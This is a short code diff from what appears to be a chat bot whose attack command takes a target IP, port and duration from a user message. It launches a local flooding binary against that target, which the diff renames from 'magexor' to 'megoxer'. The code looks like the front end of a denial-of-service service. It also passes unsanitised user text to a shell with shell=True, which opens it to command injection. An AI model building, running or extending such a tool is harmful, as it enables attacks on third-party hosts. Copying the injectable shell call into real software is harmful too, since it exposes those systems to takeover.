@@ -76,7 +76,7 @@ def attack(message):
     try:
         _, ip, port, duration = message.text.split()
         duration = min(int(duration), 180)
-        command = f"./magexor {ip} {port} {duration}"
+        command = f"./megoxer {ip} {port} {duration}"
 
         try:
             subprocess.Popen(command, shell=True)
